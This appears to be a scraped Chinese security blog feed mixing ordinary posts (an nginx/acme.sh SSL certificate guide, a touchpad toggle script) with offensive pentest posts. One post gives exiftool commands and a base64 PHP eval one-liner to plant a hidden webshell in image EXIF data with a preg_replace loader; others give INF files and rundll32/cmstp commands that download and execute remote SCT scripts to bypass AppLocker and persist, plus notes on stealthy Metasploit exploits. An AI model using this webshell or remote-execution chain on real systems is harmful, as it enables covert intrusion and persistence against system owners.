    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>开发exp背后真正的功夫跟选择的编程语言没有什么关系，而是要我们精确理解在调试时程序是如何处理一个用户输入，并利用它获得控制权的。<br>关键词就是“调试”。<br>你的逆向技术就是真正的功夫。但是，如果你的目的不是仅仅弹一个计算器，而是想要武器化，要能获得一些东西，并且想要在现实中有用，那我们需要一个开发框架，这也就是metasploit的由来。它是免费开源的，并且在世界各地都有贡献者。所以，当我们写一个metasploit的exp的时候，我们不用担心任何依赖问题，或者版本错误问题，或者担心在渗透测试时没有足够的payload可选。metasploit只需要你关注正在编写的exp上。</p>
<h2 id="模块编写前的计划"><a href="#模块编写前的计划" class="headerlink" title="模块编写前的计划"></a>模块编写前的计划</h2><p>不像编写一个POC那样，当我们编写一个metasploit模块时，我们需要考虑用户在真实环境中是如何使用的。隐密性通常是一个非常重要的事情。我们的exp能够在不生成文件的情况下执行代码吗？输入能不能看起来更随机一些从而不那么容易检测吗？是不是要加入混淆技术？exp程序有没有生成不必要的流量？它能不能在不使系统崩溃的情况下更加稳定一些呢？等等。</p>
<p>还要注意尽可能的对exp可利用的环境需求更加精准。</p>
]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>nginx + acme.sh 自动管理SSL证书</title>
    <url>/blaa/nginx-acme-sh-%E8%87%AA%E5%8A%A8%E7%AE%A1%E7%90%86SSL%E8%AF%81%E4%B9%A6.html</url>
    <content><![CDATA[<h2 id="准备nginx环境"><a href="#准备nginx环境" class="headerlink" title="准备nginx环境"></a>准备nginx环境</h2><p>建立目录专门用作ssl的证书申请</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /www/sites/le_root/.well-known/acme-challenge</span><br><span class="line">chown -R root:www-data /www/sites/le_root</span><br></pre></td></tr></table></figure>

<p>新建一个nginx配置文档<code>/www/nginx/acme-challenge.conf</code>，用作申请证书时的认证</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location /.well-known/acme-challenge/ &#123;</span><br><span class="line">    alias /www/sites/le_root/.well-known/acme-challenge/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>想让哪个网站配置ssl之前，先编辑对应的配置文件，相当于apache的vhost</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">server_name mydomain.com;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">....</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Let<span class="string">&#x27;s Encrypt webroot</span></span></span><br><span class="line">    include /www/nginx/acme-challenge.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重启nginx<br><code>systemctl reload nginx.service</code></p>
<h2 id="证书申请与安装"><a href="#证书申请与安装" class="headerlink" title="证书申请与安装"></a>证书申请与安装</h2><p>acme.sh的安装很简单，不重复了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">acme.sh --issue  -d mydomain.com -w /www/sites/le_root/</span></span><br><span class="line"></span><br><span class="line">[Wed Nov 28 23:16:55 CST 2018] Your cert is in  /root/.acme.sh/mydomain.com/mydomain.com.cer </span><br><span class="line">[Wed Nov 28 23:16:55 CST 2018] Your cert key is in  /root/.acme.sh/mydomain.com/mydomain.com.key </span><br><span class="line">[Wed Nov 28 23:16:55 CST 2018] The intermediate CA cert is in  /root/.acme.sh/mydomain.com/ca.cer </span><br><span class="line">[Wed Nov 28 23:16:55 CST 2018] And the full chain certs is there:  /root/.acme.sh/mydomain.com/fullchain.cer </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">acme.sh --install-cert -d mydomain.com \</span></span><br><span class="line"><span class="language-bash">--cert-file /etc/nginx/certs/mydomain.com/cert \</span></span><br><span class="line"><span class="language-bash">--key-file /etc/nginx/certs/mydomain.com/key \</span></span><br><span class="line"><span class="language-bash">--fullchain-file /etc/nginx/certs/mydomain.com/fullchain \</span></span><br><span class="line"><span class="language-bash">--reloadcmd <span class="string">&quot;systemctl reload nginx.service&quot;</span></span></span><br><span class="line">[Wed Nov 28 23:36:31 CST 2018] Installing cert to:/etc/nginx/certs/mydomain.com/cert</span><br><span class="line">[Wed Nov 28 23:36:31 CST 2018] Installing key to:/etc/nginx/certs/mydomain.com/key</span><br><span class="line">[Wed Nov 28 23:36:31 CST 2018] Installing full chain to:/etc/nginx/certs/mydomain.com/fullchain</span><br></pre></td></tr></table></figure>

<h2 id="nginx环境启用https"><a href="#nginx环境启用https" class="headerlink" title="nginx环境启用https"></a>nginx环境启用https</h2><p>配置域名的配置文件，启用https，并将http默认跳转到https</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name mydomain.com;</span><br><span class="line">    rewrite ^(.*)$ https://$&#123;server_name&#125;$1 permanent;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    #------- Start SSL config with http2 support ----#</span><br><span class="line">    #listen 443 http2;</span><br><span class="line">    listen 443;</span><br><span class="line">    server_name mydomain.com;</span><br><span class="line">    ssl on;</span><br><span class="line">    ssl_certificate /etc/nginx/certs/mydomain.com/fullchain;</span><br><span class="line">    ssl_certificate_key /etc/nginx/certs/mydomain.com/key;</span><br><span class="line">    ssl_session_timeout 30m;</span><br><span class="line">    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">    ssl_ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:ECDH+3DES:DH+3DES:RSA+AESGCM:RSA+AES:RSA+3DES:!aNULL:!MD5:!DSS;</span><br><span class="line">    ssl_session_cache shared:SSL:10m;</span><br><span class="line">    #ssl_dhparam /etc/nginx/ssl/theos.in/dhparams.pem;</span><br><span class="line">    ssl_prefer_server_ciphers on;</span><br><span class="line"> </span><br><span class="line">    ## Improves TTFB by using a smaller SSL buffer than the nginx default</span><br><span class="line">    ssl_buffer_size 8k;</span><br><span class="line"> </span><br><span class="line">    ## Enables OCSP stapling</span><br><span class="line">    ssl_stapling on;</span><br><span class="line">    resolver 8.8.8.8;</span><br><span class="line">    ssl_stapling_verify on;</span><br><span class="line"> </span><br><span class="line">    ## Send header to tell the browser to prefer https to http traffic</span><br><span class="line">    add_header Strict-Transport-Security max-age=31536000;</span><br><span class="line"> </span><br><span class="line">    ## SSL logs ##</span><br><span class="line">    #access_log /var/log/nginx/theos.in/ssl_access.log;</span><br><span class="line">    #error_log /var/log/nginx/theos.in/ssl_error.log;</span><br><span class="line">    #-------- END SSL config -------##</span><br><span class="line"> </span><br><span class="line">    # Add rest of your config below like document path and more ##</span><br><span class="line">    location / &#123;</span><br><span class="line">                root /www/sites/mydomain.com;</span><br><span class="line">                index  index.html index.htm;</span><br><span class="line">                #error_page 404 = /404/index.html;</span><br><span class="line">                proxy_pass http://localhost:8000/;</span><br><span class="line">        &#125;</span><br><span class="line">        include /www/nginx/acme-challenge.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="证书的更新"><a href="#证书的更新" class="headerlink" title="证书的更新"></a>证书的更新</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">crontab -u root -l</span></span><br><span class="line">5 0 * * * &quot;/root/.acme.sh&quot;/acme.sh --cron --home &quot;/root/.acme.sh&quot; &gt; /dev/null</span><br></pre></td></tr></table></figure>
<p>acme.sh在安装证书的时候，会创建一个定时任务，自动为你更新，很贴心！</p>
]]></content>
      <categories>
        <category>blaa</category>
      </categories>
      <tags>
        <tag>nginx https</tag>
        <tag>acme.sh</tag>
      </tags>
  </entry>
  <entry>
    <title>turn on/off touchpad on linux</title>
    <url>/linux/shell-script/turn-on-off-touchpad-on-linux.html</url>
    <content><![CDATA[<p>Touchpad control on Linux running on Alienware is not supported by <code>Fn+f11</code>, so you may need this small script.</p>
<blockquote>
<p>new to shell script, you might want improve it</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ &quot;$1&quot; == &quot;on&quot; ]; then</span><br><span class="line">    /usr/bin/xinput enable &quot;`xinput list | grep -i touchpad | awk &#x27;&#123;print $3&quot; &quot;$4&quot; &quot;$5&#125;&#x27;`&quot;</span><br><span class="line">elif [ &quot;$1&quot; == &quot;off&quot; ]; then</span><br><span class="line">    /usr/bin/xinput disable &quot;`xinput list | grep -i touchpad | awk &#x27;&#123;print $3&quot; &quot;$4&quot; &quot;$5&#125;&#x27;`&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot; Usage: touchpad on/off&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<blockquote>
<p>You might wannt to change <code>awk &#39;&#123;print $3&quot; &quot;$4&quot; &quot;$5&#125;&#39;</code> part so to get your whole touchpad name. Check before you run</p>
</blockquote>
<p><code>chmod +x this.sh &amp;&amp; ls -s this.sh .bin/touchpad</code> is recommended.</p>
]]></content>
      <categories>
        <category>linux</category>
        <category>shell script</category>
      </categories>
      <tags>
        <tag>scripts</tag>
        <tag>touchpad</tag>
      </tags>
  </entry>
  <entry>
    <title>利用INF Script下载执行技术来进行绕过，免杀和持久化(二)</title>
    <url>/pentest/%E5%88%A9%E7%94%A8INF%20Script%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E5%85%8D%E6%9D%80%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96(%E4%BA%8C).html</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>之前，已经介绍过了利用INF文件的下载执行远程SCT脚本来绕过的技术。总体来看，这些方法可以被用来绕过应用程序白名单策略（AWL）（比如Default AppLocker策略），阻止主机上安装的安全产品的拦截并且达到隐秘持久化的目的。另外，还提到了一些其他的下载并执行的技术，用来做环境探测，也提到了作为防御者应该考虑的一些方面。<br>如果你还没有阅读之前的一篇文章，我建议你先读一下，因为我们会在展示如下技术、方法前使用到前面文章中提到的技术：</p>
<ul>
<li>InfDefaultInstall</li>
<li>IExpress</li>
<li>IEadvpack.dll (LaunchINFSection)</li>
<li>IE4uinit</li>
</ul>
<h2 id="复习下Setupapi-dll-InstallHinfSection-和-Advpack-dll-LaunchINFSection"><a href="#复习下Setupapi-dll-InstallHinfSection-和-Advpack-dll-LaunchINFSection" class="headerlink" title="复习下Setupapi.dll (InstallHinfSection) 和 Advpack.dll (LaunchINFSection)"></a>复习下Setupapi.dll (InstallHinfSection) 和 Advpack.dll (LaunchINFSection)</h2>]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>利用EXIFTool 隐藏WebShell</title>
    <url>/web-sec/%E5%88%A9%E7%94%A8EXIFTool%20%E9%9A%90%E8%97%8FWebShell.html</url>
    <content><![CDATA[<p>[TOC]<br>##意义<br>常见WebShell比较容易识别，利用图片exif信息可以达到隐藏WebShell的目的，以便持久化。（当然，这不是持久化的最好方法，不过作为临时持久化方法还是可以试试的）</p>
<p>##工具</p>
<ol>
<li>ExifTool</li>
<li>一句话木马</li>
<li>中国菜刀客户端</li>
<li>图片</li>
</ol>
<p>##步骤</p>
<ol>
<li><p>跟度娘要一张喜欢的图片<br>  略了</p>
</li>
<li><p>安装ExifTool<br>  2.1 环境Kali<br>  2.2 命令：apt-get install exiftool</p>
</li>
<li><p>向图片中写入一句话木马<br>  执行命令：<br>  <code>exiftool &quot;-comment=&lt;test.php timg.jpg&quot;</code><br>  <code>exiftool &quot;-model=/.*/e&quot; timg.jpg</code><br>  字符串：<br>  aWYgKGlzc2V0KCRfUE9TVFsiY21kIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJjbWQiXSkpO30&#x3D;<br>  Base64解码之后的东西，我就补贴出来了，总之密码是cmd<br>  执行结果如下：<br>  <img src="/images/700275c77a5c6cf8c104892eec10f84475b03ad8.png" alt="微信截图_20170918185956.png"><br>  可以看到我们的一句话木马就写到了图片信息当中</p>
</li>
<li><p>修改版一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$exif</span> = <span class="title function_ invoke__">exif_read_data</span>(<span class="string">&#x27;/www/web/phpshell_google_com/public_html/timg.jpg&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$exif</span>[Model],<span class="variable">$exif</span>[Make],<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>GetShell<br>  <img src="/images/abc51c58dadcc228ff13b9e07e8b08b51116c0a3.png" alt="微信截图_20170918191022.png"></p>
</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>[1] 图片路径可以是绝对路径，也可以是相对路径，如果是相对路径不要忘记<code>./</code>符号哦<br>[2] 测试PHP版本为5.5.根据大牛提示，preg_replace函数的<code>/e</code>选项在<code>&gt;5.6</code>版本中废除，不过也有别的函数替代。思路是对的，注意函数使用。<br>[3] 不要长时间盯着苍老师的图片看，图有魔性~~<br>##参考<br>[1] <a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/">https://www.trustwave.com/Resources/SpiderLabs-Blog/Hiding-Webshell-Backdoor-Code-in-Image-Files/</a><br>[2] <a href="https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html">https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html</a></p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>利用INF Script下载执行技术来进行绕过，免杀和持久化</title>
    <url>/pentest/%E5%88%A9%E7%94%A8INF%20Script%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E6%8A%80%E6%9C%AF%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E5%85%8D%E6%9D%80%E5%92%8C%E6%8C%81%E4%B9%85%E5%8C%96.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/164986.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：m0nst3r@DigApis安全”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>通过对MSDN上一些处理不同COM脚本的调查和测试，结合网上的分享，我发现了一些有意思的东西，这些发现可能是远程调用执行脚本新方法。<br>其中最有意思的是<code>LaunchINFSection</code>。</p>
<p>这篇文章主要讨论一下网上公开的利用<code>INF Script</code>的方法，并介绍下<code>LaunchINFSection</code>，最后再分享一些用法和作为防御者应该注意的事项。另外，还会给出一些其他远程执行脚本方法的参考。</p>
<h2 id="INF-Script执行方法"><a href="#INF-Script执行方法" class="headerlink" title="INF Script执行方法"></a><code>INF Script</code>执行方法</h2><p>通过INF配置文件来执行脚本文件（<code>.sct</code>）的方法会涉及到<code>InstallHinfSection(setipapi.dll)</code>，<code>CMSTP</code>和<code>LaunchINFSection(advpack.dll)</code>。</p>
<h3 id="使用InstallHinfSection执行INF-Script脚本"><a href="#使用InstallHinfSection执行INF-Script脚本" class="headerlink" title="使用InstallHinfSection执行INF Script脚本"></a>使用<code>InstallHinfSection</code>执行<code>INF Script</code>脚本</h3><p>在DerbyCon 2017中<code>KyleHanslovan</code>和<code>ChrisBisnett</code>展示了一个非常有意思的东西，我已经将其翻译和整理过来（传送门：<a href="http://www.m0nst3r.me/web-sec/290.html" title="透过Autoruns看持久化绕过姿势的分享">透过Autoruns看持久化绕过姿势的分享</a> ）。他们展示 了一种通过INF 远程调用执行<code>sct</code>脚本文件的方法：<br><code>rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 [path to file.inf]</code></p>
<p>作者给出的INF文件如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">; Required Sections</span><br><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">[Version] </span><br><span class="line">Signature=$CHICAGO$</span><br><span class="line">Provider=test</span><br><span class="line">Class=Printer</span><br><span class="line"></span><br><span class="line">[Manufacturer]</span><br><span class="line">HuntressLabs=ModelsSection,NTx86,NTia64,NTamd64</span><br><span class="line"></span><br><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">; Models Section</span><br><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">[ModelsSection.NTx86]</span><br><span class="line">UnregisterDlls = Squiblydoo</span><br><span class="line"></span><br><span class="line">[ModelsSection.NTia64]</span><br><span class="line">UnregisterDlls = Squiblydoo</span><br><span class="line"></span><br><span class="line">[ModelsSection.NTamd64]</span><br><span class="line">UnregisterDlls = Squiblydoo</span><br><span class="line"></span><br><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">; Support Sections</span><br><span class="line">; ----------------------------------------------------------------------</span><br><span class="line">[DefaultInstall]</span><br><span class="line">UnregisterDlls = Squiblydoo</span><br><span class="line"></span><br><span class="line">[Squiblydoo]</span><br><span class="line">11,,scrobj.dll,2,60,https://gist.githubusercontent.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302/raw/ef22366bfb62a2ddea8c5e321d3ce2f4c95d2a66/Backdoor-Minimalist.sct</span><br></pre></td></tr></table></figure>

<p>上面的命令会去调用默认INF块，即<code>DefaultInstall</code>，在这个块下，通过<code>UnregisterDlls</code>调用了<code>Squiblydoo</code>块下的恶意命令，通过<code>scrobj.dll</code>下载并执行指定的脚本文件。</p>
<h3 id="使用CMSTP执行INF-Script脚本"><a href="#使用CMSTP执行INF-Script脚本" class="headerlink" title="使用CMSTP执行INF Script脚本"></a>使用<code>CMSTP</code>执行<code>INF Script</code>脚本</h3><p><code>NickTyrer</code>展示了一种用<code>cmstp.exe</code>加载INF文件来下载SCT脚本并执行COM脚本文件的方法。<code>Oddvarmoe</code>曾展示了用<code>cmdtp.exe</code>来绕过UAC和AppLocker默认策略。<br>基本用法如下：<br><code>cmstp.exe /s [file].inf</code></p>
<p>INF文件内容参考如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">;cmstp.exe /s cmstp.inf</span><br><span class="line"></span><br><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line"></span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct</span></span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Yay&quot;</span><br><span class="line">ShortSvcName=&quot;Yay&quot;</span><br></pre></td></tr></table></figure>

<p>通过如上的INF文件，<code>cmstp.exe</code>会调用文件中的<code>DefaultInstall_SingleUser</code>块。在这个块中，<code>UnRegisterOCXs</code>调用了<code>UnRegisterOCXSection</code>块来执行恶意操作，通过<code>scrobj.dll</code>来下载并执行指定的SCT脚本文件。</p>
<h3 id="使用LaunchINFSection执行INF-Script脚本"><a href="#使用LaunchINFSection执行INF-Script脚本" class="headerlink" title="使用LaunchINFSection执行INF Script脚本"></a>使用<code>LaunchINFSection</code>执行<code>INF Script</code>脚本</h3><p>根据MSDN的说明，<code>LaunchINFSection</code>是Advanced INF Package Installer（<code>advpack.dll</code>）的一个方法，用来调用INF文件中的某个块。从管理员的角度看，INF文件是一个用来安装设备驱动或Windows <code>.cab</code>文件的指令文件，包括注册Windows二进制（exe,dll,ocx），在注册表中增加键值，或设置一些关键参数的操作。<br>调用<code>LaunchINFSection</code>的方法如下：<br><code>rundll32.exe advpack.dll,LaunchINFSection [file].inf, [INF Section], [Path to Cab].cab, [Installation Flags]</code><br>如果不指定<code>[INF Section]</code>，<code>LaunchINFSection</code>将会调用默认的<code>DefaultInstall</code>块。另外，值得注意的是，<code>advpack.dll</code>还提供了<code>LaunchINFSectionEX</code>方法和与其它字符集兼容的<code>LaunchINFSectionA</code>，来完成<code>LaunchINFSection</code>同样的功能。</p>
<p>作为PoC例子，我们使用如下的INF和SCT文件来测试：</p>
<p>INF文件（保存为test.inf）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">;cmstp.exe /s cmstp.inf</span><br><span class="line"></span><br><span class="line">[version]</span><br><span class="line">Signature=$chicago$</span><br><span class="line">AdvancedINF=2.5</span><br><span class="line"></span><br><span class="line">[DefaultInstall_SingleUser]</span><br><span class="line">UnRegisterOCXs=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line">[UnRegisterOCXSection]</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">11%\scrobj.dll,NI,https://gist.githubusercontent.com/bohops/6ded40c4989c673f2e30b9a6c1985019/raw/33dc4cae00a10eb86c02b561b1c832df6de40ef6/test.sct</span></span><br><span class="line"></span><br><span class="line">[Strings]</span><br><span class="line">AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;</span><br><span class="line">ServiceName=&quot;Yay&quot;</span><br><span class="line">ShortSvcName=&quot;Yay&quot;</span><br></pre></td></tr></table></figure>

<p>SCT文件：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?XML version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scriptlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">registration</span></span></span><br><span class="line"><span class="tag">    <span class="attr">description</span>=<span class="string">&quot;Bandit&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">progid</span>=<span class="string">&quot;Bandit&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">version</span>=<span class="string">&quot;1.00&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">classid</span>=<span class="string">&quot;&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span></span></span><br><span class="line"><span class="tag">	&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll</span></span><br><span class="line"><span class="comment">	&lt;!-- DFIR --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--		.sct files are downloaded and executed from a path like this --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Though, the name and extension are arbitary.. --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct --&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- Based on current research, no registry keys are written, since call &quot;uninstall&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">&lt;!-- Proof Of Concept - Casey Smith @subTee --&gt;</span> </span><br><span class="line">        <span class="comment">&lt;!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		]]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">registration</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">public</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">&quot;Exec&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">public</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	function Exec()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">		var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;notepad.exe&quot;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">	&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用下面的命令来执行一下：<br><code>rundll32.exe advpack.dll,LaunchINFSection test.inf,DefaultInstall_SingleUser,1,</code></p>
<p>如果网络没有问题的话，会出现我们可爱的计算器：<br><img src="/images/8fd7f28f2c8f55b518a25bcdbc330cb5ad9be459.png" alt="343-calc-2.png"></p>
<p>这里，我们还可以用稍微不同的方法启动我们的程序，例如，把INF文件中的入口块改成<code>DefaultInstall</code>，那么我们就可以使用下面的命令执行程序，而无需指定一个块名字：</p>
<p><code>rundll32.exe advpack.dll,LaunchINFSection test.inf,,1,</code></p>
<p><img src="/images/94e38be9dd8f9b9f172f1d8f466a2fc42d12fdf3.png" alt="343-calc-3.png"></p>
<p>另外，我们也可以将卸载OCX的命令改成一个安装&#x2F;注册的命令<code>RegisterOCXs</code>，并且随便一个名字来运行我们的程序：</p>
<p><img src="/images/f3acb436f9858f057e2c50baf6fef83931bac94e.png" alt="343-calc-4.png"></p>
<h2 id="使用和防御方法"><a href="#使用和防御方法" class="headerlink" title="使用和防御方法"></a>使用和防御方法</h2><h3 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h3><p><img src="/images/cfce3994e7ee1a3666ca9a0a8de2b315c75bb124.png" alt="343-launchinfsectionmalware.png"></p>
<p><img src="/images/4be9040651b679759ad5a717304030f7279869cc.png" alt="343-launchinfsectionmalware2.png"></p>
<h3 id="绕过，免杀和持久化"><a href="#绕过，免杀和持久化" class="headerlink" title="绕过，免杀和持久化"></a>绕过，免杀和持久化</h3><p>CMSTP可用来绕过Autoruns（当开启隐藏Windows条目时），如下图：<br><img src="/images/04f6876a5a5f9a7b1d4b09b0dfd4e673d017d361.png" alt="343-cmstp_autoruns1.png"></p>
<p>当不启用隐藏过滤功能时，CMSTP做的自启动项如下：<br><img src="/images/f10e842796c98b6d36fb947066ea9b8cc138b285.png" alt="343-cmstp_autoruns2.png"></p>
<p>注意：LaunchINFSection和InstallHinfSection不会以绕过新版本的Autoruns，因为这种启动方法依靠rundll32.exe调用相应的dll。当启用过滤时，Autoruns还是会显示这些自启动项。但是，<code>LaunchINFSection</code>提供了我们一种通过程序白名单绕过AppLocker规则来获得<code>代码执行</code>的技术。</p>
<h3 id="网络中的流量"><a href="#网络中的流量" class="headerlink" title="网络中的流量"></a>网络中的流量</h3><p>下图是通过scrobj.dll来下载一个SCT文件时产生的流量：<br><img src="/images/3926bed09eb975bc06be2fc6e68643d6b5151b33.png" alt="343-get_request.png"></p>
<h3 id="任意文件名"><a href="#任意文件名" class="headerlink" title="任意文件名"></a>任意文件名</h3><p>SCT文件只不过是<code>text/XML</code>文档，而INF文件只不过是<code>text</code>文档，其后缀扩展名可以不是<code>.sct</code>或<code>.inf</code>，但依然可以成功执行。（此处译者并没有实验成功，希望各位表哥赐教！）</p>
<h3 id="其它方法"><a href="#其它方法" class="headerlink" title="其它方法"></a>其它方法</h3><p>使用INF文件执行并不是唯一可以执行SCT脚本文件的方法，还有一些其它方法：</p>
<h4 id="RegSvr32-x2F-Scrobj-dll"><a href="#RegSvr32-x2F-Scrobj-dll" class="headerlink" title="RegSvr32&#x2F;Scrobj.dll"></a>RegSvr32&#x2F;Scrobj.dll</h4><p><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md" title="RegSvr32/Scrobj.dll">RegSvr32&#x2F;Scrobj.dll</a></p>
